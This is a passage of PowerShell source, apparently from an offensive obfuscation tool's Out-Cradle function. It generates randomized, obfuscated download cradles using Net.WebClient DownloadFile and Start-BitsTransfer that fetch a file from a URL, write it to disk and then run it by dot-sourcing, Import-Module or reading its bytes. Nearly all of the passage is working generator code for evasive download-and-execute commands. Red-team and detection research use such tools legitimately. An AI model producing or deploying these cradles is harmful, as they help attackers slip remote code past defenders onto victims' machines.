                            $DownloadFileWithTags = $DownloadFileWithTags.Trim("'").Replace($DownloadFile,("'" + $DownloadFile + "'")).Replace("''","'")
                            $DownloadFile         = "'" + $DownloadFile.Trim("'") + "'"
                        }
  
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }

                        $PathValueForEvaluation = $Path
                        If($Path.StartsWith('<<<') -AND $Path.EndsWith('>>>'))
                        {
                            $PathValueForEvaluation = $Path.SubString(4,$Path.Length-4-4)
                        }
                        
                        # Do not deal with sourcing or quotes if $Path is actually PowerShell code (e.g., $Profile, (Get-Variable Profile).Value).
                        If($PathValueForEvaluation -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])')
                        {
                            $Path        = $Path
                            $PathQuoted  = $Path
                            $PathSourced = $Path
                        }
                        Else
                        {
                            # Remove any quotes around path. They should only be added for DownloadFile and ::ReadAllBytes methods (and ::ReadAllBytes is already handled in syntax array at beginning of this script).
                            $Path = $Path.Trim("'")

                            # Create separate variables for DownloadFile method with quotes added to $Path.
                            $PathQuoted = "'$Path'"

                            # $Path must be sourced or have a full path when used with Dot-Source and Import-Module invocation syntaxes.
                            $PathSourced = $Path

                            # Since $Path is not currently sourced and does not have a full path then we will add syntax for the current directory since that's how the DownloadFile method interprets this.
                            # $SourceRandom is either ./ or .\ syntax.
                            If($Path.StartsWith('<<<') -AND ($Path.SubString(4) -NotMatch '^([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathSourced = $Path.SubString(0,4) + $SourceRandom + $Path.SubString(4)
                            }
                            ElseIf($Path -NotMatch '^([A-Z]:|\\\\|.[/\\])')
                            {
                                $PathSourced = "$SourceRandom$Path"
                            }

                            # If Invocation is dot-source or Import-Module/IPMO then when $Path is set as a variable it must be dot-sourced.
                            If(($Invoke -Match '^(<<<[01]|)(Import-Module|IPMO|[.]) ') -AND ($Path -NotMatch '^(<<<[01]|)([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathQuoted = $PathQuoted.Replace($Path,"$SourceRandom$Path")
                            }
                        }

                        $IsDiskCradle = $FALSE

                        If($Invoke -eq $InvokeTag)
                        {
                            $SyntaxToInvoke = ''
                        }
                        ElseIf($Invoke.Contains($PathTag) -AND !($Invoke.Contains($InvokeTag)))
                        {
                            $SyntaxToInvoke = $Invoke.Replace($PathTag,$GetVar5)
                            $Invoke         = $InvokeTag
                            $IsDiskCradle   = $TRUE
                        }
                        Else
                        {
                            # Since $GetVar5 is a variable we will remove any quotes that may be encapsulating it (only for ::ReadAllBytes option).
                            $SyntaxToInvoke = $GetBytesRandom.Replace("'$PathTag'",$PathTag).Replace($PathTag,$GetVar5)
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"
                        $CommandArray += "$SetVar5$PathQuoted"

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$GetVar3)"

                        $CommandArray += "$SetVar4$DownloadFile"
                        $CommandArray += "$GetVar1.$GetVar4($GetVar2,$GetVar5)"

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag))
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }

                        # Remove single quotes when DownloadFile is used directly as a method instead of a string stored in a variable (as in above command arrangement).
                        While($DownloadFile.Contains("'DownloadFile'"))
                        {
                            $DownloadFile = $DownloadFile.Replace("'DownloadFile'","DownloadFile")
                        }

                        If($DownloadFile.EndsWith(')') -OR $DownloadFile.EndsWith(')0>>>'))
                        {
                            $DownloadFileInvoke = $DownloadFile + '.Invoke'
                        }
                        Else
                        {
                            $DownloadFileInvoke = $DownloadFile
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient)"

                        $CommandArray2 += "$SetVar2'$Url'"
                        $CommandArray2 += "$SetVar5$PathQuoted"
                        $CommandArray2 += "$GetVar1.$DownloadFileInvoke($GetVar2,$GetVar5)"

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag) -OR $IsDiskCradle)
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If($Invoke -ne $InvokeTag)
                            {
                                $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray2 += $Command
                            }
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_012]   + $CommandArray[3,4,5,6,7] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_012] + $CommandArray2[3,4,5,6]  -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.

                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 5

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadFile         = $DownloadFile.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $DownloadFileWithTags = $DownloadFileWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)
                      
                    # Add .Invoke to the end of $GetVar4 and $GetVar4WithTags.
                    $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,($GetVar4 + '.Invoke'))
                    $GetVar4         = $GetVar4 + '.Invoke'
                      
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Path','Command','CommandEscapedString','NewObject','DownloadFile')
                    For($i=1; $i -le 2; $i++)
                    {
                        # Encapsulate DownloadFile in single quotes if basic syntax is used.
                        If($DownloadFile.Contains('DownloadFile'))
                        {
                            $DownloadFileWithTags = $DownloadFileWithTags.Trim("'").Replace($DownloadFile,("'" + $DownloadFile + "'")).Replace("''","'")
                            $DownloadFile         = "'" + $DownloadFile.Trim("'") + "'"
                        }
  
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }

                        $PathValueForEvaluation = $Path
                        If($Path.StartsWith('<<<') -AND $Path.EndsWith('>>>'))
                        {
                            $PathValueForEvaluation = $Path.SubString(4,$Path.Length-4-4)
                        }
                        
                        # Do not deal with sourcing or quotes if $Path is actually PowerShell code (e.g., $Profile, (Get-Variable Profile).Value).
                        If($PathValueForEvaluation -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])')
                        {
                            $Path        = $Path
                            $PathQuoted  = $Path
                            $PathSourced = $Path
                        }
                        Else
                        {
                            # Remove any quotes around path. They should only be added for DownloadFile and ::ReadAllBytes methods (and ::ReadAllBytes is already handled in syntax array at beginning of this script).
                            $Path = $Path.Trim("'")

                            # Create separate variables for DownloadFile method with quotes added to $Path.
                            $PathQuoted = "'$Path'"

                            # $Path must be sourced or have a full path when used with Dot-Source and Import-Module invocation syntaxes.
                            $PathSourced = $Path

                            # Since $Path is not currently sourced and does not have a full path then we will add syntax for the current directory since that's how the DownloadFile method interprets this.
                            # $SourceRandom is either ./ or .\ syntax.
                            If($Path.StartsWith('<<<') -AND ($Path.SubString(4) -NotMatch '^([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathSourced = $Path.SubString(0,4) + $SourceRandom + $Path.SubString(4)
                            }
                            ElseIf($Path -NotMatch '^([A-Z]:|\\\\|.[/\\])')
                            {
                                $PathSourced = "$SourceRandom$Path"
                            }

                            # If Invocation is dot-source or Import-Module/IPMO then when $Path is set as a variable it must be dot-sourced.
                            If(($Invoke -Match '^(<<<[01]|)(Import-Module|IPMO|[.]) ') -AND ($Path -NotMatch '^(<<<[01]|)([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathQuoted = $PathQuoted.Replace($Path,"$SourceRandom$Path")
                            }
                        }

                        $IsDiskCradle = $FALSE

                        If($Invoke -eq $InvokeTag)
                        {
                            $SyntaxToInvoke = ''
                        }
                        ElseIf($Invoke.Contains($PathTag) -AND !($Invoke.Contains($InvokeTag)))
                        {
                            $SyntaxToInvoke = $Invoke.Replace($PathTag,$GetVar5)
                            $Invoke         = $InvokeTag
                            $IsDiskCradle   = $TRUE
                        }
                        Else
                        {
                            # Since $GetVar5 is a variable we will remove any quotes that may be encapsulating it (only for ::ReadAllBytes option).
                            $SyntaxToInvoke = $GetBytesRandom.Replace("'$PathTag'",$PathTag).Replace($PathTag,$GetVar5)
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"
                        $CommandArray += "$SetVar5$PathQuoted"

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$GetVar3)"

                        $CommandArray += "$SetVar4$DownloadFile"
                        
                        If($GetVar4.Contains('.Value'))
                        {
                            $CommandArray += "$GetVar1." + $GetVar4.Replace('(','((').Replace('.Value','.Value)') + "($GetVar2,$GetVar5)"
                        }
                        Else
                        {
                            $CommandArray += "$GetVar1.$GetVar4($GetVar2,$GetVar5)"
                        }

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag))
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }

                        # Remove single quotes when DownloadFile is used directly as a method instead of a string stored in a variable (as in above command arrangement).
                        While($DownloadFile.Contains("'DownloadFile'"))
                        {
                            $DownloadFile = $DownloadFile.Replace("'DownloadFile'","DownloadFile")
                        }

                        If($DownloadFile.EndsWith(')') -OR $DownloadFile.EndsWith(')0>>>'))
                        {
                            $DownloadFileInvoke = $DownloadFile + '.Invoke'
                        }
                        Else
                        {
                            $DownloadFileInvoke = $DownloadFile
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient)"

                        $CommandArray2 += "$SetVar2'$Url'"
                        $CommandArray2 += "$SetVar5$PathQuoted"
                        $CommandArray2 += "$GetVar1.$DownloadFileInvoke($GetVar2,$GetVar5)"

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag) -OR $IsDiskCradle)
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If($Invoke -ne $InvokeTag)
                            {
                                $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray2 += $Command
                            }
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_012]   + $CommandArray[3,4,5,6,7] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_012] + $CommandArray2[3,4,5,6]  -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        21 {
            #################################
            ## PsBits - Start-BitsTransfer ##
            #################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Default syntax (no variables used to break up command syntax).
                    
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Path','Command','CommandEscapedString','StartBitsTransfer','SourceFlag','DestinationFlag')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }

                        $PathValueForEvaluation = $Path
                        If($Path.StartsWith('<<<') -AND $Path.EndsWith('>>>'))
                        {
                            $PathValueForEvaluation = $Path.SubString(4,$Path.Length-4-4)
                        }
                        
                        # Do not deal with sourcing or quotes if $Path is actually PowerShell code (e.g., $Profile, (Get-Variable Profile).Value).
                        If($PathValueForEvaluation -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])')
                        {
                            $Path        = $Path
                            $PathQuoted  = $Path
                            $PathSourced = $Path
                        }
                        Else
                        {
                            # Remove any quotes around path. They should only be added for DownloadFile and ::ReadAllBytes methods (and ::ReadAllBytes is already handled in syntax array at beginning of this script).
                            $Path = $Path.Trim("'")

                            # Create separate variables for DownloadFile method with quotes added to $Path.
                            $PathQuoted = "'$Path'"

                            # $Path must be sourced or have a full path when used with Dot-Source and Import-Module invocation syntaxes.
                            $PathSourced = $Path

                            # Since $Path is not currently sourced and does not have a full path then we will add syntax for the current directory since that's how the DownloadFile method interprets this.
                            # $SourceRandom is either ./ or .\ syntax.
                            If($Path.StartsWith('<<<') -AND ($Path.SubString(4) -NotMatch '^([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathSourced = $Path.SubString(0,4) + $SourceRandom + $Path.SubString(4)
                            }
                            ElseIf($Path -NotMatch '^([A-Z]:|\\\\|.[/\\])')
                            {
                                $PathSourced = "$SourceRandom$Path"
                            }

                            # If Invocation is dot-source or Import-Module/IPMO then when $Path is set as a variable it must be dot-sourced.
                            If(($Invoke -Match '^(<<<[01]|)(Import-Module|IPMO|[.]) ') -AND ($Path -NotMatch '^(<<<[01]|)([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathQuoted = $PathQuoted.Replace($Path,"$SourceRandom$Path")
                            }
                        }

                        $IsDiskCradle = $FALSE

                        If($Invoke -eq $InvokeTag)
                        {
                            $SyntaxToInvoke = ''
                        }
                        ElseIf($Invoke.Contains($PathTag) -AND !($Invoke.Contains($InvokeTag)))
                        {
                            $SyntaxToInvoke = $Invoke.Replace($PathTag,$PathQuoted)
                            $Invoke         = $InvokeTag
                            $IsDiskCradle   = $TRUE
                        }
                        Else
                        {
                            $SyntaxToInvoke = $GetBytesRandom.Replace("'$PathTag'",$PathTag).Replace($PathTag,$PathQuoted)
                        }

                        # Add quotes if $Url or $Path contains whitespace.
                        If($Url.Contains(' ') -AND !($Url -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Url -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Url = "'$Url'"
                        }
                        If($Path.Contains(' ') -AND !($Path -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Path -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Path = "'$Path'"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$StartBitsTransfer$SourceFlag$Url $DestinationFlag$Path"

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag))
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = $CommandArray -Join ';'

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'url'   # Url
                    $RandomVarName2 = 'dpath' # Path

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Path','Command','CommandEscapedString','StartBitsTransfer','SourceFlag','DestinationFlag')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }

                        $PathValueForEvaluation = $Path
                        If($Path.StartsWith('<<<') -AND $Path.EndsWith('>>>'))
                        {
                            $PathValueForEvaluation = $Path.SubString(4,$Path.Length-4-4)
                        }
                        
                        # Do not deal with sourcing or quotes if $Path is actually PowerShell code (e.g., $Profile, (Get-Variable Profile).Value).
                        If($PathValueForEvaluation -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])')
                        {
                            $Path        = $Path
                            $PathQuoted  = $Path
                            $PathSourced = $Path
                        }
                        Else
                        {
                            # Remove any quotes around path. They should only be added for DownloadFile and ::ReadAllBytes methods (and ::ReadAllBytes is already handled in syntax array at beginning of this script).
                            $Path = $Path.Trim("'")

                            # Create separate variables for DownloadFile method with quotes added to $Path.
                            $PathQuoted = "'$Path'"

                            # $Path must be sourced or have a full path when used with Dot-Source and Import-Module invocation syntaxes.
                            $PathSourced = $Path

                            # Since $Path is not currently sourced and does not have a full path then we will add syntax for the current directory since that's how the DownloadFile method interprets this.
                            # $SourceRandom is either ./ or .\ syntax.
                            If($Path.StartsWith('<<<') -AND ($Path.SubString(4) -NotMatch '^([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathSourced = $Path.SubString(0,4) + $SourceRandom + $Path.SubString(4)
                            }
                            ElseIf($Path -NotMatch '^([A-Z]:|\\\\|.[/\\])')
                            {
                                $PathSourced = "$SourceRandom$Path"
                            }

                            # If Invocation is dot-source or Import-Module/IPMO then when $Path is set as a variable it must be dot-sourced.
                            If(($Invoke -Match '^(<<<[01]|)(Import-Module|IPMO|[.]) ') -AND ($Path -NotMatch '^(<<<[01]|)([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathQuoted = $PathQuoted.Replace($Path,"$SourceRandom$Path")
                            }
                        }

                        $IsDiskCradle = $FALSE

                        If($Invoke -eq $InvokeTag)
                        {
                            $SyntaxToInvoke = ''
                        }
                        ElseIf($Invoke.Contains($PathTag) -AND !($Invoke.Contains($InvokeTag)))
                        {
                            $SyntaxToInvoke = $Invoke.Replace($PathTag,$GetVar2)
                            $Invoke         = $InvokeTag
                            $IsDiskCradle   = $TRUE
                        }
                        Else
                        {
                            $SyntaxToInvoke = $GetBytesRandom.Replace("'$PathTag'",$PathTag).Replace($PathTag,$GetVar2)
                        }

                        # Add quotes if $Url or $Path contains whitespace.
                        If($Url.Contains(' ') -AND !($Url -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Url -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Url = "'$Url'"
                        }
                        If($Path.Contains(' ') -AND !($Path -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Path -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Path = "'$Path'"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"
                        $CommandArray += "$SetVar2$PathQuoted"
                        $CommandArray += "$StartBitsTransfer$SourceFlag$GetVar1 $DestinationFlag$GetVar2"

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag))
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray[$ArrayIndexOrder_01] + $CommandArray[2,3]) -Join ';'

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                    
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Path','Command','CommandEscapedString','StartBitsTransfer','SourceFlag','DestinationFlag')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }

                        $PathValueForEvaluation = $Path
                        If($Path.StartsWith('<<<') -AND $Path.EndsWith('>>>'))
                        {
                            $PathValueForEvaluation = $Path.SubString(4,$Path.Length-4-4)
                        }
                        
                        # Do not deal with sourcing or quotes if $Path is actually PowerShell code (e.g., $Profile, (Get-Variable Profile).Value).
                        If($PathValueForEvaluation -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])')
                        {
                            $Path        = $Path
                            $PathQuoted  = $Path
                            $PathSourced = $Path
                        }
                        Else
                        {
                            # Remove any quotes around path. They should only be added for DownloadFile and ::ReadAllBytes methods (and ::ReadAllBytes is already handled in syntax array at beginning of this script).
                            $Path = $Path.Trim("'")

                            # Create separate variables for DownloadFile method with quotes added to $Path.
                            $PathQuoted = "'$Path'"

                            # $Path must be sourced or have a full path when used with Dot-Source and Import-Module invocation syntaxes.
                            $PathSourced = $Path

                            # Since $Path is not currently sourced and does not have a full path then we will add syntax for the current directory since that's how the DownloadFile method interprets this.
                            # $SourceRandom is either ./ or .\ syntax.
                            If($Path.StartsWith('<<<') -AND ($Path.SubString(4) -NotMatch '^([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathSourced = $Path.SubString(0,4) + $SourceRandom + $Path.SubString(4)
                            }
                            ElseIf($Path -NotMatch '^([A-Z]:|\\\\|.[/\\])')
                            {
                                $PathSourced = "$SourceRandom$Path"
                            }

                            # If Invocation is dot-source or Import-Module/IPMO then when $Path is set as a variable it must be dot-sourced.
                            If(($Invoke -Match '^(<<<[01]|)(Import-Module|IPMO|[.]) ') -AND ($Path -NotMatch '^(<<<[01]|)([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathQuoted = $PathQuoted.Replace($Path,"$SourceRandom$Path")
                            }
                        }

                        $IsDiskCradle = $FALSE

                        If($Invoke -eq $InvokeTag)
                        {
                            $SyntaxToInvoke = ''
                        }
                        ElseIf($Invoke.Contains($PathTag) -AND !($Invoke.Contains($InvokeTag)))
                        {
                            $SyntaxToInvoke = $Invoke.Replace($PathTag,$GetVar2)
                            $Invoke         = $InvokeTag
                            $IsDiskCradle   = $TRUE
                        }
                        Else
                        {
                            $SyntaxToInvoke = $GetBytesRandom.Replace("'$PathTag'",$PathTag).Replace($PathTag,$GetVar2)
                        }

                        # Add quotes if $Url or $Path contains whitespace.
